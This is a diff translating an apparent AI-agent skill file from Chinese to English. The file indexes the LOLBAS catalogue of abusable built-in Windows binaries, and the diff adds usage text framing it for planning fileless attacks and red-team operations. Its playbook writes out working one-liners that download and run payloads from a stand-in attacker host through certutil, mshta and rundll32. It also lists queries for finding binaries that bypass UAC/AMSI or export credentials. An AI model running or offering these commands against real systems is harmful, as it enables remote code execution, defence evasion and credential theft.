@@ -2,47 +2,48 @@
 name: lolbas-living-off-land
 description: "LOLBAS project: Use built-in tools to download/execute payloads and fileless rundll32 execution. Signals: fileless attack, lolbins, find binaries that download files, find binaries that execute commands, find binaries that export credentials."
 zh-signals: "LOLBAS 项目: 系统自带工具下载并执行 payload、rundll32 无文件执行。信号:无文件攻击,lolbins,查可下载文件的二进制,查可执行命令的二进制,查可导出凭据的。"
+when-to-use: "Use when planning fileless attacks or defense evasion and you need to find built-in Windows binaries that download files, execute commands, or export credentials. Use as a reference index during red-team operations."
 ---
 
-# LOLBAS 项目
+# LOLBAS Project
 
-- 攻击大类:C23 无文件与LOLBins滥用
-- 上游仓库:https://github.com/LOLBAS-Project/LOLBAS
-- 上游 License:MIT(内容库)(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C23 Fileless Attacks and LOLBins Abuse
+- Upstream Repository: https://github.com/LOLBAS-Project/LOLBAS
+- Upstream License: MIT (content library) (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
-git clone https://github.com/LOLBAS-Project/LOLBAS 或在线查询 lolbas-project.github.io
+git clone https://github.com/LOLBAS-Project/LOLBAS or browse lolbas-project.github.io online
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `git grep -i 'download' -- '*.md'` | 查可下载文件的二进制 |
-| `git grep -i 'execution'` | 查可执行命令的二进制 |
-| `git grep -i 'encode'` | 查可编码的(binary → base64) |
-| `git grep -i 'bypass'` | 查可绕 UAC/AMSI 的 |
-| `git grep -i 'credentials'` | 查可导出凭据的 |
+| `git grep -i 'download' -- '*.md'` | Find binaries that can download files |
+| `git grep -i 'execution'` | Find binaries that can execute commands |
+| `git grep -i 'encode'` | Find binaries that can encode (binary → base64) |
+| `git grep -i 'bypass'` | Find ones that can bypass UAC/AMSI |
+| `git grep -i 'credentials'` | Find binaries that can export credentials |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 系统自带工具下载并执行 payload
+### Download and execute a payload with built-in tools
 
 ```bash
-# 用 certutil 下载+执行(常被白名单放行):
+# Download and execute with certutil (often allowed by allowlists):
 certutil.exe -urlcache -split -f http://attacker/x.exe C:\Windows\Temp\x.exe && C:\Windows\Temp\x.exe
-# 用 mshta 执行远程脚本:
+# Execute a remote script with mshta:
 mshta.exe http://attacker/evil.hta
 ```
 
-### rundll32 无文件执行
+### Fileless execution with rundll32
 
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker/x.sct")
 ```
 
-## 注意事项
+## Notes
 
-Windows 自带 200+ 可滥用二进制的权威索引;每个条目含审计命令与绕过用法,Agent 按场景检索。
+The authoritative index of 200+ abusable built-in Windows binaries; every entry lists the audit command and bypass usage, so agents can search it by scenario.
